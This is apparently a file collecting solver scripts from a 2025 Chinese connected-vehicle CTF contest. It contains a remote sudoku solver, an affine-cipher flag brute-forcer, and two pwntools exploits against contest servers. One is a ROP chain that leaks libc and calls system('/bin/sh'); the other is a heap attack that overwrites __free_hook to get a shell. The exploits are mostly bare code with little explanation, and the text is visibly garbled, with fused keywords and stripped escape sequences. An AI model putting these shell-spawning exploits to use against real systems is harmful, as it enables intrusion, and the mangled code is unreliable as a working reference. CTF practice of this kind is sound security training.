# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/2025_“招商铸盾”_智能网联汽车攻防赛WP.md
# TITLE: 2025 “招商铸盾” 智能网联汽车攻防赛WP
# CATEGORY: pwn

from pwn import *
import numpy as np

def solve_sudoku(board):
    def is_valid(row, col, num):
        # 检查行
        for i in range(9):
            if board[row][i] == num:
                returnFalse

        # 检查列
        for j in range(9):
            if board[j][col] == num:
                returnFalse

        # 检查3x3宫格
        start_row, start_col = 3 * (row // 3), 3 * (col // 3)
        for i in range(3):
            for j in range(3):
                if board[start_row + i][start_col + j] == num:
                    returnFalse
        returnTrue

    def find_empty():
        for i in range(9):
            for j in range(9):
                if board[i][j] == 0:
                    return i, j
        returnNone

    empty = find_empty()
    ifnot empty:
        returnTrue
    row, col = empty

    for num in range(1, 10):
        if is_valid(row, col, num):
            board[row][col] = num
            if solve_sudoku(board):
                returnTrue
            board[row][col] = 0

    returnFalse

def parse_sudoku(data):
    # 提取数独网格部分
    lines = []
    for line in data.split('n'):
        if line.startswith(tuple('ABCDEFGHI')):
            lines.append(line)

    # 解析数独网格
    board = np.zeros((9, 9), dtype=int)
    for i, line in enumerate(lines):
        # 移除行标签和多余空格
        clean_line = line[2:].replace(' ', '').replace('.', '0')
        for j, char in enumerate(clean_line):
            if j < 9and char.isdigit():
                board[i][j] = int(char)
    return board

def format_move(row, col, num):
    row_letter = chr(65 + row)
    col_num = col + 1
    returnf"{row_letter}{col_num} {num}"

def main():
    # 连接服务器
    conn = remote('124.133.253.44', 32805)

    # 接收欢迎信息和数独题目
    data = conn.recvuntil("请输入答案格式")
    print(data.decode(encoding="utf-8"))

    # 解析数独题目
    board = parse_sudoku(data.decode(encoding="utf-8"))
    print("解析的数独题目:")
    print(board)

    # 复制一份原始板用于比较
    original_board = board.copy()

    # 解决数独
    if solve_sudoku(board):
        print("n数独解决方案:")
        print(board)

        # 收集所有需要填写的移动
        moves = []
        for i in range(9):
            for j in range(9):
                if original_board[i][j] == 0:  # 只发送原始为空的位置
                    moves.append(format_move(i, j, board[i][j]))

        # 发送所有移动
        for move in moves:
            conn.sendline(move.encode(encoding="utf-8"))
            print(conn.recvuntil("请输入答案格式").decode(encoding="utf-8"))

        # 发送检查命令
        conn.sendline('check'.encode(encoding="utf-8"))
        print("n服务器响应:")
        print(conn.recvall().decode(encoding="utf-8"))
    else:
        print("无法解决数独")
        conn.close()

if __name__ == "__main__":
    main()
YWlweHs4MjNqNTZwMzdhcDkycDkzcGQ0ZzdhZDZhMHAwMXAyMX0=
def affine_decrypt(ciphertext, a, b):
    plaintext = ""
    inverse_a = 0
    for i in range(26):
        if (a * i) % 26 == 1:
            inverse_a = i
            break

    for char in ciphertext:
        if char.isalpha():
            char_num = ord(char) - ord('a')
            decrypted_char_num = (inverse_a * (char_num - b)) % 26
            decrypted_char = chr(decrypted_char_num + ord('a'))
            plaintext += decrypted_char
        else:
            plaintext += char

    return plaintext

def brute_force(ciphertext):
    for a in range(1, 26):
        for b in range(26):
            plaintext = affine_decrypt(ciphertext, a, b)
            print(f"Using key: a={a}, b={b} -> {plaintext}")

# 示例
ciphertext = 'aipx{823j56p37ap92p93pd4g7ad6a0p01p21}'
brute_force(ciphertext)
from pwn import *

context.log_level = "debug"
context.terminal = ["wt.exe","wsl"]

elf = ELF("./pwn")
# p = elf.process()
p = remote("124.133.253.44",32856)
libc = ELF("./libc-2.27.so")

def debug():
    gdb.attach(p)
    pause()

# debug()
gadget_1 = 0x40063A
gadget_2 = 0x400620

pop_rdi = 0x0000000000400643
pop_rsi = 0x0000000000400641
# : pop rsi ; pop r15 ; ret

payload = b"B" * 0x88
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(elf.got["read"]) * 2
payload += p64(elf.plt["write"])
payload += p64(0x4005BD)
p.send(payload)

p.recvuntil(b"B" * 0x88)
p.recv(0x100 - 0x88)
libc.address = u64(p.recv(6).ljust(8,b"x00")) - libc.sym["read"]
log.success("addr = " + hex(libc.address))

payload = b"A" * 0x88 + p64(pop_rdi) + p64(next(libc.search(b"/bin/shx00")))
payload += p64(libc.sym["system"])
p.send(payload)

p.interactive()
from pwn import *
        
sd = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
rc   = lambda num=4096   :p.recv(num)
ru  = lambda text   :p.recvuntil(text)
rl  = lambda    :p.recvline()
pr = lambda num=4096 :
print(p.recv(num))
ia   = lambda        :p.interactive()

context(arch = "amd64",os = "linux",log_level = "debug")

elf = ELF("./pwn")
libc = ELF("./libc-2.31.so")

def add(idx, size):
    sla(">> ", str(1))
    sla("Index: ", str(idx))
    sla("Size: ", str(size))

def delete(idx):
    sla(">> ", str(2))
    sla("Index: ", str(idx))

def edit(idx, pay, cont):
    sla(">> ", str(3))
    sla("Index: ", str(idx))
    sla("size of content: ", pay)
    sa("you want to say: ", cont)

def pwn():
    global p
    p = process("./pwn")
    # p = remote("124.133.253.44", 32906)
    for i in range(12):
        add(i, 0x80)
    
    payload = b"%136c"+ p64(0x511)
    edit(0, payload, "a")
    stdout_offset = libc.sym["_IO_2_1_stdout_"] & 0xffff
    delete(1)
    for i in range(12, 12+9):
        add(i, 0x80)

    for i in range(12, 12+7):
        delete(i)
        
    delete(20)
    delete(19)
    add(1, 0x80)
    delete(9)

    add(12, 0x40)
    add(13, 0x30)
    edit(12, b'A'*0x50+p64(0x420), "aaaa")
    edit(13, b'A'*8, b'A'*0x38+b"x90x26")
    add(14, 0x80)
    add(15, 0x80)
    edit(15, b"A"*8, flat(0, 0xfbad1800,0,0,0)+b"x00")
    ru(p64(0))
    libc.address = u64(p.recv(6).ljust(8,b'x00')) - 0x1ec980

    print(hex(libc.address))
    
    edit(13, b"A"*8, b'A'*0x28+flat(0, 0x91))
    delete(14)
    edit(13, b"A"*8 , b'A'*0x38+p64(libc.sym["__free_hook"]-8))
    add(16, 0x80)
    add(17, 0x80)
    edit(17, p64(libc.sym["system"]), p64(libc.sym["system"])*4)
    
    edit(10, b'A'*0x90 + b"/bin/shx00", "aaaa")
    delete(11)
    ia()

pwn()
